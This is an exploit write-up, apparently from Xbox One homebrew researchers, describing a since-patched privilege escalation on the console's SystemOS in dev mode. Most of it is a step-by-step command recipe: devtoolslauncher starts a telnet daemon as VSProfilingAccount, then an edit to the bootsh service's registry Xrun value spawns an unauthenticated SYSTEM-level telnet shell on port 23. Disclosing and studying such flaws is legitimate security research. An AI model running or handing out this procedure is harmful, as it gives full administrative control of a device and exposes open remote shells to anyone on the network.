# SystemOS Elevation of privileges via VSProfiling account

## Metadata
|                             |                                                     |
|-----------------------------|-----------------------------------------------------|
|Release date                 |                                                 N/A |
|Author                       |                                   Xbox One Research |
|Classification               |                             Elevation of privileges |
|Patched                      |                                                 yes |
|Patch date                   |                                                 N/A |
|First patched system version |                                                 N/A |
|Source                       |                                                 N/A |
|Download                     |                                                 N/A |

## Info
Previously dev mode let us use the devtoolslauncher program to start a "slightly elevated" process.
After this registry could be modified.
This way it was possible to rewrite process execution path of the bootsh service to start a full-privileged process.

This writeup explains how to start a "slightly privileged" on port 24 and a full-privileged telnet daemon on port 23.

## Prerequisites
- Dev Mode
- Shell access

## Instructions
1. SSH to your console as **DevToolsUser** and  **VS Pairing Pin** as password.
2. Execute the following command to start a telnet-daemon on port 24 as User "VSProfilingAccount".
```
devtoolslauncher LaunchForProfiling telnetd "cmd.exe 24"
```
3. Start a telnet connection to Port *24*
4. Execute the following commands on this telnet connection, this will start a telnet daemon on port 23 as local administrator:
```
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Bootsh\Parameters\Commands /v Xrun /t REG_SZ /d "telnetd.exe cmd.exe 23" /f
sc start bootsh
```
5. Wait 10 seconds to make sure bootsh service started completely
6. Now reset the registry-value to it's standard value by executing the following
```
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Bootsh\Parameters\Commands /v Xrun /t REG_SZ /d "xrun.exe SystemBootTasks" /f
```
7. Start a **new** telnet connection to Port *23* - That's our awaited *SYSTEM*-shell